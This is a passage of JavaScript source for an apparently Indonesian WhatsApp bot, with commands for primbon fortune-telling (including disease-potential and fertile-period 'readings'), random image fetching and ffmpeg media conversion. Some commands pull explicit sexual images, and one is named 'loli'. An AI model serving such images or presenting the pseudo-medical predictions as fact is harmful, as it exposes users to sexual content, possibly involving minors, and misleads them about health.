Araa.sendMessage(from, { text: `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`,}, { quoted: setQuoted })
}
break
case 'ramalanjodohbali':
case 'ramaljodohbali':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, {text: `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`,},{ quoted: setQuoted })
}
break
case 'suamiistri':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{text: `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`,},{ quoted: setQuoted })
}
break
case 'ramalancinta':
case 'ramalcinta':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, {text: `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`,},{ quoted: setQuoted })
}
break
case 'artinama':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'kecocokannama':
case 'cocoknama':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`,},{ quoted: setQuoted })}
break
case 'kecocokanpasangan':
case 'cocokpasangan':
case 'pasangan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{image: { url: anu.message.gambar },caption: `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`,},{ quoted: setQuoted })
}
break
case 'sifatusaha':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}` }, { quoted: setQuoted })
}
break
case 'rejeki':
case 'rezeki':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'pekerjaan':
case 'kerja':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'ramalannasib':
case 'ramalnasib':
case 'nasib':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{text: `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`,},{ quoted: setQuoted })
}
break
case 'potensipenyakit':
case 'penyakit':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'fengshui':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{text: `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`,},{ quoted: setQuoted })
}
break
case 'haribaik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'harisangar':
case 'taliwangke':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'harinaas':
case 'harisial':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{ text: `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}` },{ quoted: setQuoted })
}
break
case 'nagahari':
case 'harinaga':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{ text: `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}` },{ quoted: setQuoted })
}
break
case 'arahrejeki':
case 'arahrezeki':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{ text: `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}` },{ quoted: setQuoted })
}
break
case 'peruntungan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{ text: `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}` },{ quoted: setQuoted })
}
break
case 'weton':
case 'wetonjawa':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{text: `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`,},{ quoted: setQuoted })
}
break
case 'sifat':
case 'karakter':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}` }, { quoted: setQuoted })
}
break
case 'keberuntungan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}` }, { quoted: setQuoted })
}
break
case 'memancing':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'masasubur':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'zodiak':
case 'zodiac':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} 7 7 2005`)
let zodiak = [
['capricorn', new Date(1970, 0, 1)],
['aquarius', new Date(1970, 0, 20)],
['pisces', new Date(1970, 1, 19)],
['aries', new Date(1970, 2, 21)],
['taurus', new Date(1970, 3, 21)],
['gemini', new Date(1970, 4, 21)],
['cancer', new Date(1970, 5, 22)],
['leo', new Date(1970, 6, 23)],
['virgo', new Date(1970, 7, 23)],
['libra', new Date(1970, 8, 23)],
['scorpio', new Date(1970, 9, 23)],
['sagittarius', new Date(1970, 10, 22)],
['capricorn', new Date(1970, 11, 22)],
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_, _d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from,{text: `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`,},{ quoted: setQuoted })
}
break
case 'shio':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return setReply(anu.message)
Araa.sendMessage(from, { text: `⭔ *Hasil :* ${anu.message}` }, { quoted: setQuoted })
}
break
//================================================================================\\
case 'cogan':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isUserLimit(senderNumber, isPremium, isOwner)) return onlyLimit()
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
var query = ['cogan hd', 'cogan indo', 'cowo ganteng', 'handsome boy', 'hot boy', 'oppa', 'cowo aesthetic', 'cogan aesthetic']
var data = await pinterest(pickRandom(query))
var but = [{ buttonId: `${command}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
Araa.sendMessage(from, { caption: 'Random Cowo Ganteng', image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: m })
break
case 'cecan':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
var query = ['cecan hd', 'cecan indo', 'cewe cantik', 'cewe aesthetic', 'cecan aesthetic']
var data = await pinterest(pickRandom(query))
var but = [{ buttonId: `${command}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
Araa.sendMessage(from, { caption: 'Random Cewe Cantik', image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: m })
break
case 'anime':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
await fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt').then((res) => res.text()).then((body) => {
let tod = body.split('\n')
let pjr = tod[Math.floor(Math.random() * tod.length)]
imageToBase64(pjr).then((response) => {
media = Buffer.from(response, 'base64')
Araa.sendMessage(from, { image: media, caption: 'NIH' }, { quoted: m })}).catch((error) => {
console.log(error)
})
})
break
case 'loli':
case 'milf':
case 'husbu':
case 'cosplay':
case 'wallml':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * wipu.length)]
let kentir = await getBuffer(wipi)
let teks = 'Nih'
let buttons = [
{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 },
{ buttonId: `${prefix}owner`, buttonText: { displayText: '🐤OWNER' }, type: 1 },
]
Araa.sendButImage(from, teks, fake, kentir, buttons, { quoted: m })
}
break
case 'wallpapers':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let link = `https://megayaa.herokuapp.com/api/akaneko/wallpapers`
let nana = await getBuffer(link)
Araa.sendImage(from, nana, 'Nih', m)
}
break
case 'wallpapermobile':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let link = `https://megayaa.herokuapp.com/api/akaneko/mobileWallpapers`
let nana = await getBuffer(link)
Araa.sendImage(from, nana, 'Nih', m)
}
break
case 'neko':
case 'waifu':
case 'trap':
case 'blowjob':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let ana = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = 'Nih'
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
Araa.sendButImage(from, teks, fake, kentir, buttons, { quoted: setQuoted })
}
break
case 'shinobu':
case 'megumin':
case 'bully':
case 'cuddle':
case 'cry':
case 'hug':
case 'awoo':
case 'kiss':
case 'lick':
case 'pat':
case 'smug':
case 'bonk':
case 'yeet':
case 'blush':
case 'smile':
case 'wave':
case 'highfive':
case 'handhold':
case 'nom':
case 'bite':
case 'glomp':
case 'slap':
case 'kill':
case 'happy':
case 'wink':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let ana = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = 'Nih'
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
Araa.sendButImage(from, teks, fake, kentir, buttons, { quoted: setQuoted })
}
break
case 'neko2':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let ana = await fetchJson(`https://api.waifu.pics/sfw/neko`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = 'Nih'
let buttons = [{ buttonId: `${prefix}neko2`, buttonText: { displayText: `➡️Next` }, type: 1 }]
Araa.sendButImage(from, teks, fake, kentir, buttons, { quoted: setQuoted })
}
break
case 'waifunime':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let ana = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = 'Nih'
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
Araa.sendButImage(from, teks, fake, kentir, buttons, { quoted: setQuoted })
}
break
case 'hug2':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let ana = await fetchJson(`https://nekos.life/api/v2/img/hug`)
let anu = ana.url
let kentir = await getBuffer(anu)
let teks = 'Nih'
let buttons = [{ buttonId: `${prefix}hug2`, buttonText: { displayText: `➡️Next` }, type: 1 }]
Araa.sendButImage(from, teks, fake, kentir, buttons, { quoted: setQuoted })
}
break
case 'waifus':
case 'nekos':
case 'luffy':
case 'elaina':
case 'zoro':
case 'tomori':
case 'gintama':
case 'miku':
case 'yotsuba':
case 'onepiece':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let anu = await pinterest2(command)
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: '➡️Next' }, type: 1 }]
let buttonMessage = {
image: { url: result },
caption: 'Nih',
footer: fake,
buttons: buttons,
headerType: 4,
}
Araa.sendMessage(from, buttonMessage, { quoted: setQuoted })
}
break
case 'couple':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
Araa.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, { quoted: setQuoted })
Araa.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, { quoted: setQuoted })
}
break
case 'coffe':
case 'kopi':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
let buttons = [{ buttonId: `${prefix}coffe`, buttonText: { displayText: 'Next Image' }, type: 1 }]
let buttonMessage = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`,
footer: fake,
buttons: buttons,
headerType: 4,
}
Araa.sendMessage(from, buttonMessage, { quoted: setQuoted })
}
break
//================================================================================\\
case 'toimg':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isQuotedSticker) return setReply('Reply stickernya')
onlyWait()
let media = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buffer = fs.readFileSync(ran)
await Araa.sendMessage(from, { caption: 'Nih', image: buffer })
fs.unlinkSync(ran)
})
}
break
case 'tomp3':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedVideo) {
onlyWait()
let media = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await Araa.sendMessage(from, { mimetype: 'audio/mp4', audio: buffer453 }, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply('Reply videonya')
}
break
case 'tomp4':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedSticker) {
onlyWait()
let file = await Araa.downloadAndSaveMediaMessage(quoted)
let outGif = `./temp/${getRandom('.gif')}`
let outMp4 = `./temp/${getRandom('.mp4')}`
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
await Araa.sendMessage(from, { video: fs.readFileSync(outMp4), caption: 'Nih' }, { quoted: m })
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
})
}
break
case 'toptt':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedAudio) {
onlyWait()
let media = await Araa.downloadAndSaveMediaMessage(quoted)
